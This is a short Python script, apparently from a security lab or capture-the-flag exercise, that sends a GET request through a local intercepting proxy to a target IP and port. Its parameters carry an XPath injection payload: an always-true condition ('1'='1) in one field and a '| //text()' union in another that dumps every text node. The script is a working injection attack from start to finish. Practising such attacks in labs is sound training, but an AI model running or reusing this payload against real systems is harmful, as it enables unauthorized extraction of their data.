import requests
import sys
# GET Request

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = "http://94.237.51.214:44980/index.php"

data = {
	 # 'q': sys.argv[1], Caso queira usar argumentos
	 'q': "SOMETHINGINVALID') or ('1'='1", 
	 'f': 'fullstreetname | //text()'
}

response = requests.get(url, params=data, headers=headers, proxies=proxies)
print(response.status_code)
print(response.text)
